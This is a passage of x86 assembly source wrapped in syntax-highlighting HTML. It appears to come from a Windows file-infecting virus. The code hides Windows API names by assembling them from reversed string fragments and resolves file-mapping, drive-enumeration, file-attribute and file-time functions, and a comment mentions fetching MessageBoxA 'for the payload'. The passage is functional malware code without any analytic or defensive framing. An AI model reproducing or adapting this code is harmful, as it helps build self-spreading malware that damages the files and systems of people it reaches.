                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hUser32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; failed: it's used only to</span><span class="sc0">
                                               </span><span class="sc1">; get MessageBoxA for the</span><span class="sc0">
                                               </span><span class="sc1">; payload</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hKernel</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Place to construct the addresses</span><span class="sc0">
                                            </span><span class="sc1">; names</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'aerC'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'iFet'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Ael'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get CreateFileA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CreateFileA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ppaM'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Agni'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get CreateFileMappingA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CreateFileMappingA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'VpaM'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Owei'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'liFf'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get MapViewOfFile</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_MapViewOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'amnU'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get UnmapViewOfFile</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_UnmapViewOfFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'SteG'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'etsy'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'miTm'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get GetSystemTime</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetSystemTime</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'virD'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'pyTe'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Ae'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get GetDriveTypeA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetDriveTypeA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'igoL'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Dlac'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'evir'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'irtS'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Asgn'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get GetLogicalDriveStringsA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetLogicalDriveStringsA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'tsyS'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'eDme'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'luaf'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ICLt'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'D'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get GetSystemDefaultLCID</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetSystemDefaultLCID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'CteS'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'erru'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'iDtn'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'tcer'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Ayro'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get SetCurrentDirectoryA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetCurrentDirectoryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FteG'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Seli'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ezi'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get GetFileSize</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'rttA'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'tubi'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Ase'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get GetFileAttributesA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetFileAttributesA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'FteS'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get SetFileAttributesA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'nioP'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ret'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get SetFilePointer</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFilePointer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'emiT'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFunction</span><span class="sc0">   </span><span class="sc1">; Get SetFileTime</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFileTime</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OdnE'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'liFf'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
